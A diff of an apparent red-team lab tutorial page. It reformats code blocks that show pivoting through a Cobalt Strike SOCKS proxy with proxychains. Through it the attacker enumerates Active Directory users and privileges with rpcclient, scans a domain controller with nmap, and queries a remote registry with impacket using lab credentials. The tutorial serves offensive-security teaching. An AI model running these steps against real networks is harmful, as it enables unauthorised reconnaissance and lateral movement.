@@ -38,13 +38,11 @@ The below shows a couple of things. First one - two Cobalt Strike sessions:
 
 Second - attacker opens a socks4 proxy on port 7777 on his local kali machine \(10.0.0.5\) by issuing:
 
-{% tabs %}
-{% tab title="attacker@cobaltstrike" %}
+{% code title="attacker@cobaltstrike" %}
 ```text
 socks 7777
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-05-00-08-58.png)
 
@@ -52,13 +50,11 @@ This means that the attacker can now use proxychains to proxy traffic from their
 
 Let's see how this works by firstly updating the proxychains config file:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 nano /etc/proxychains.conf
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-04-23-20-21.png)
 
@@ -66,50 +62,42 @@ nano /etc/proxychains.conf
 
 Once proxychains are configured, the attacker can start enumerating the AD environment through the beacon like so:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 proxychains rpcclient 10.0.0.6 -U spotless
 enumdomusers
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![Victim \(10.0.0.2\) is enumerating DC \(10.0.0.6\) on behalf of attacker \(10.0.0.5\)](../../.gitbook/assets/screenshot-from-2019-02-05-20-22-43.png)
 
 Moving on, same way, they can query info about specific AD users:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 queryuser spotless
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-04-23-34-33.png)
 
 Enumerate current user's privileges and many more \(consult rpcclient for all available commands\):
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 enumprivs
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-04-23-34-42.png)
 
 Finally, of course they can run nmap if needed:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 proxychains nmap 10.0.0.6 -T4 -p 21,22,23,53,80,443,25 -sT
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-04-23-36-48.png)
 
@@ -119,13 +107,11 @@ Impacket provides even more tools to enumerate remote systems through compromise
 
 This is what happens - attacker \(10.0.0.5\) uses proxychains with impacket's reg utility to retrieve the hostname of the box at 10.0.0.7 \(WS02\) via the compromised \(CS beacon\) box 10.0.0.2 \(WS01\):
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 proxychains reg.py offense/administrator:123456@10.0.0.2 -target-ip 10.0.0.7 query -keyName hklm\system\currentcontrolset\control\computername\computername
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 The below shows traffic captures that illustrate that the box 10.0.0.2 enumerates 10.0.0.7 using SMB traffic only:
 
